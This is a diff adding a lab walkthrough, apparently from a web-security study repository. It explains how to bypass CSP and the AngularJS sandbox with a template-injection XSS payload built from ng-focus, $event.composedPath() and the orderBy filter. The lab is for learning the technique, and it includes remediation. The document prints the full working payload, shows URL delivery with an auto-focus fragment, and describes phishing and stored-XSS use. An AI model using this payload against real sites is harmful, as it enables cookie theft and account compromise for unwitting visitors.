@@ -10023,3 +10023,474 @@ Sandbox present → break charAt
 ```
 
 ---
+
+# 🐞Lab-25 — AngularJS + CSP Bypass (ng-focus + $event Technique)
+
+---
+
+## 🧭 Overview
+
+This lab demonstrates a **highly restricted XSS scenario** where:
+
+✔ CSP blocks traditional JavaScript execution  
+✔ AngularJS sandbox blocks dangerous objects (`window`, `eval`, etc.)  
+✔ Direct payloads completely fail  
+
+---
+
+### ⚠️ Restrictions
+
+- ❌ `<script>` blocked  
+- ❌ `alert()` directly blocked  
+- ❌ `eval`, `window`, `document` restricted  
+- ❌ Inline JS blocked by CSP  
+
+---
+
+### 🧠 Core Idea
+
+AngularJS introduces its **own execution layer**
+
+👉 Flow:
+
+```
+HTML → AngularJS parses → executes expressions
+```
+
+---
+
+👉 So instead of:
+
+```
+alert(document.cookie)
+```
+
+❌ Blocked
+
+---
+
+👉 We use:
+
+✔ AngularJS directives (`ng-focus`)  
+✔ AngularJS objects (`$event`)  
+✔ AngularJS filters (`orderBy`)  
+
+---
+
+## 🔹 What Is This Topic?
+
+Client-side XSS using:
+
+- AngularJS template injection  
+- CSP bypass  
+- Sandbox escape  
+
+---
+
+## 🔄 Execution Flow
+
+```
+User Input → AngularJS Template → Directive Trigger → Expression Execution → JS Runs
+```
+
+---
+
+## 🪜 Lab Walkthrough
+
+---
+
+### 1️⃣ Test Reflection
+
+Input:
+
+```
+XSS123
+```
+
+---
+
+### 2️⃣ Observe Output
+
+```
+{{value}}
+```
+
+---
+
+✅ Meaning:
+
+- AngularJS is active  
+- Your input is inside template context  
+
+---
+
+### 3️⃣ Identify Injection Point
+
+Example:
+
+```
+<h1>0 search results for {{value}}</h1>
+```
+
+---
+
+👉 Your input is executed inside:
+
+```
+{{value}}
+```
+
+---
+
+### 4️⃣ Identify Restrictions
+
+- CSP enabled ❌  
+- Angular sandbox active ❌  
+- Input length restricted ❌  
+
+---
+
+👉 Conclusion:
+
+```
+Normal XSS will FAIL
+```
+
+---
+
+### 5️⃣ Move Payload to URL
+
+```
+?search=PAYLOAD
+```
+
+---
+
+👉 Why:
+
+- URL allows longer payload  
+- Bypasses input length restriction  
+
+---
+
+### 6️⃣ Create Execution Trigger
+
+```
+<input id=x ng-focus=PAYLOAD>
+```
+
+---
+
+Add:
+
+```
+#x
+```
+
+---
+
+👉 Result:
+
+- Page loads  
+- Input auto-focused  
+- `ng-focus` executes  
+
+---
+
+### 7️⃣ Use AngularJS Internal Object
+
+```
+$event
+```
+
+---
+
+👉 Hidden object → contains event data
+
+---
+
+### 8️⃣ Extract Window Indirectly
+
+```
+$event.composedPath()
+```
+
+---
+
+👉 Returns:
+
+```
+[input → div → body → html → window]
+```
+
+---
+
+### 9️⃣ Force Execution
+
+```
+| orderBy:
+```
+
+---
+
+👉 AngularJS filter → executes expression
+
+---
+
+### 🔥 10️⃣ Final Payload
+
+```
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
+```
+
+---
+
+👉 Deliver via URL (encoded)
+
+---
+
+### 💥 Result
+
+```
+alert(document.cookie)
+```
+
+---
+
+## 📸 Screenshots
+
+---
+
+### 🖼️ 1️⃣ Reflection Test (Alphanumeric Input)
+
+```
+Input: XSS123
+
+Output:
+{{value}} → XSS123
+```
+
+![reflection](../images/angular-csp-reflection-payload.png)
+
+---
+
+### 🖼️ 2️⃣ Final Payload Execution (URL Injection)
+
+```
+Payload:
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
+
+URL:
+?search=PAYLOAD#x
+```
+
+![payload](../images/angular-csp-bypass-paylaod.png)
+
+---
+
+## 💣 Payload Breakdown
+
+---
+
+### 🔹 Trigger Element
+
+```
+<input id=x ...>
+```
+
+👉 Creates focus target
+
+---
+
+### 🔹 Auto Trigger
+
+```
+#x
+```
+
+👉 Forces focus → executes `ng-focus`
+
+---
+
+### 🔹 Angular Object
+
+```
+$event
+```
+
+👉 Access event data
+
+---
+
+### 🔹 Path Extraction
+
+```
+$event.composedPath()
+```
+
+👉 Gets DOM chain → includes `window`
+
+---
+
+### 🔹 Execution Engine
+
+```
+| orderBy:
+```
+
+👉 Executes expression
+
+---
+
+### 🔹 Code Execution
+
+```
+(z=alert)(document.cookie)
+```
+
+---
+
+Step-by-step:
+
+```
+z = alert
+```
+
+Assign function
+
+```
+(z)(document.cookie)
+```
+
+Execute function
+
+---
+
+## 🧠 Why This Works
+
+---
+
+### ✅ CSP Bypass
+
+- No `<script>`  
+- No inline JS  
+- No `eval`  
+
+---
+
+### ✅ AngularJS Bypass
+
+- Uses internal features  
+- No direct `window` usage  
+- Execution via filters  
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 1️⃣ Legacy AngularJS Apps
+
+```
+<h1>{{userInput}}</h1>
+```
+
+---
+
+👉 Found in:
+
+- Admin panels  
+- Dashboards  
+- Old SaaS apps  
+
+---
+
+### 🟢 2️⃣ CSP-Protected Apps
+
+Even with:
+
+```
+Content-Security-Policy: strict
+```
+
+👉 Angular still executes internally
+
+---
+
+### 🟢 3️⃣ Phishing / Link Delivery
+
+```
+https://victim.com/?search=PAYLOAD#x
+```
+
+---
+
+👉 Victim clicks → auto execution
+
+---
+
+### 🟢 4️⃣ Stored XSS
+
+- Comments  
+- Profiles  
+- Messages  
+
+---
+
+👉 Executes for all users
+
+---
+
+## 🔗 Attack Chain
+
+```
+Find Angular → Inject {{}} → Use directive → Access $event
+→ Extract window → Execute via filter → XSS
+```
+
+---
+
+## 🛡️ Remediation
+
+---
+
+✔ Remove AngularJS (legacy)  
+✔ Never inject user input into templates  
+✔ Use proper encoding  
+✔ Enforce strict CSP  
+
+---
+
+## 💡 Pro Hunter Mindset
+
+---
+
+Ask yourself:
+
+```
+Is AngularJS used?
+Is {{ }} present?
+Can I use directive (ng-*)?
+Can I access $event?
+Can I force execution via filters?
+```
+
+---
+
+## 🧠 Ultimate Mental Model
+
+```
+CSP blocks JS
+Angular creates new execution engine
+
+→ Abuse Angular instead of bypassing CSP
+```
+
+---
+
+## 🎯 Final One-Liner
+
+```
+When CSP blocks JavaScript → let AngularJS execute it for you
+```
